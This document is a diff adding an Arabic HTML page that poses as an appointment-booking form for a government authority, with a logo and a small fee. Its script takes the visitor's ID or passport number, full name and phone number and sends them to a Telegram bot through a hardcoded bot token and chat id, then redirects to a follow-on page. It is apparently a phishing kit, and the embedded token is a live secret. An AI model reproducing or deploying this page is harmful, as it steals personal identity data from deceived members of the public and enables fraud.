@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>نموذج الهوية والعنوان</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+    }
+
+    header {
+      position: fixed;
+      top: 0;
+      width: 100%;
+      background: #ffffff;
+      height: 80px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      z-index: 999;
+    }
+
+    header img {
+      height: 50px;
+    }
+
+    main {
+      margin-top: 110px;
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+    }
+
+    form {
+      background: #fff;
+      padding: 25px;
+      border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: #333;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px 10px;
+      margin-bottom: 15px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 15px;
+      background: #f9f9f9;
+      transition: border-color 0.3s;
+    }
+
+    input:focus, select:focus {
+      border-color: #4CAF50;
+      outline: none;
+    }
+
+    .note {
+      text-align: center;
+      font-weight: bold;
+      color: #444;
+      margin-top: 20px;
+      margin-bottom: 20px;
+      text-align: right;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 17px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #43a047;
+    }
+
+    @media (max-width: 480px) {
+      form {
+        padding: 20px 15px;
+      }
+
+      input, select, button {
+        font-size: 16px;
+      }
+    }
+    h2{
+        margin-top: 150px;
+        margin-bottom: -50px;
+    }
+
+    #identityForm{
+        margin-bottom: 150px;
+    }
+    h1{
+        text-align: center;
+        font-size: 16px;
+    }
+
+     #imghedar{
+        margin-left: 200px;
+        width: 240px;
+        margin-left: -1px;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="Logo_ar.svg" alt="شعار">
+</header>
+<h2>حجز موعد في الهيئة</h2>
+
+
+<main>
+  <form id="identityForm" autocomplete="off">
+    <label for="idType">نوع الهوية</label>
+    <select id="idType" name="idType" required>
+      <option value="">اختر نوع الهوية</option>
+      <option value="personal">الرقم الشخصي</option>
+      <option value="passport">رقم الجواز</option>
+    </select>
+
+    <label for="idNumber" id="idNumberLabel" style="display:none;">رقم الهوية</label>
+    <input type="text" id="idNumber" name="idNumber" style="display:none;" />
+
+    <label for="fullName">الاسم الكامل</label>
+    <input type="text" id="fullName" name="fullName" required />
+
+    <label for="phone">رقم الهاتف</label>
+    <input type="tel" id="phone" name="phone" required inputmode="numeric" pattern="[0-9]*" />
+
+
+
+    <p class="note">الرسوم: نص دينار</p>
+
+    <button type="submit">إرسال</button>
+  </form>
+</main>
+<script>
+  const idTypeSelect = document.getElementById('idType');
+  const idNumberInput = document.getElementById('idNumber');
+  const idNumberLabel = document.getElementById('idNumberLabel');
+  const phoneInput = document.getElementById('phone');
+
+  idTypeSelect.addEventListener('change', () => {
+    const val = idTypeSelect.value;
+    if (val === 'passport') {
+      idNumberLabel.style.display = 'block';
+      idNumberInput.style.display = 'block';
+      idNumberInput.value = '';
+      idNumberInput.placeholder = 'أدخل رقم الجواز';
+      idNumberInput.pattern = '[A-Za-z0-9]+';
+      idNumberInput.title = 'أحرف إنجليزية وأرقام فقط';
+      idNumberInput.inputMode = 'text';
+    } else if (val === 'personal') {
+      idNumberLabel.style.display = 'block';
+      idNumberInput.style.display = 'block';
+      idNumberInput.value = '';
+      idNumberInput.placeholder = 'أدخل الرقم الشخصي';
+      idNumberInput.pattern = '[0-9]+';
+      idNumberInput.title = 'أرقام فقط';
+      idNumberInput.inputMode = 'numeric';
+      idNumberInput.maxLength = 20;
+    } else {
+      idNumberLabel.style.display = 'none';
+      idNumberInput.style.display = 'none';
+      idNumberInput.value = '';
+    }
+  });
+
+  idNumberInput.addEventListener('input', () => {
+    if (idTypeSelect.value === 'personal') {
+      idNumberInput.value = idNumberInput.value.replace(/[^0-9]/g, '');
+    } else if (idTypeSelect.value === 'passport') {
+      idNumberInput.value = idNumberInput.value.replace(/[^A-Za-z0-9]/g, '');
+    }
+  });
+
+  phoneInput.addEventListener('input', () => {
+    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+  });
+
+  document.getElementById('identityForm').addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    if (idTypeSelect.value && !idNumberInput.value) {
+      alert('يرجى إدخال رقم الهوية.');
+      return;
+    }
+
+    const data = {
+      نوع_الهوية: idTypeSelect.options[idTypeSelect.selectedIndex].text,
+      رقم_الهوية: idNumberInput.value,
+      الاسم_الكامل: document.getElementById('fullName').value,
+      الهاتف: phoneInput.value
+    };
+
+    const message = ` حجز موعد   \n\n` +
+      `نوع الهوية: ${data.نوع_الهوية}\n` +
+      `رقم الهوية: ${data.رقم_الهوية}\n` +
+      `الاسم الكامل: ${data.الاسم_الكامل}\n` +
+      `رقم الهاتف: ${data.الهاتف}\n` +
+      `💰 الرسوم: 1 دينار`;
+
+    const token = '7560209528:AAHmrp_W1zklaJK69WV5ytCJyh7yqmRO9HM'; 
+    const chat_id = '7595871538'; 
+    const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    fetch(telegramURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        localStorage.setItem("fullName", data.الاسم_الكامل);
+                    
+        
+        window.location.href = "bneft2.html";
+
+        
+         document.getElementById('identityForm').reset();
+        idNumberLabel.style.display = 'none';
+        idNumberInput.style.display = 'none';
+      } else {
+        alert('❌ حدث خطأ أثناء الإرسال.');
+      }
+    })
+    .catch(error => {
+      console.error('Telegram Error:', error);
+      alert('❌ فشل الاتصال بـ Telegram.');
+    });
+  });
+</script>
+
+</body>
+</html>
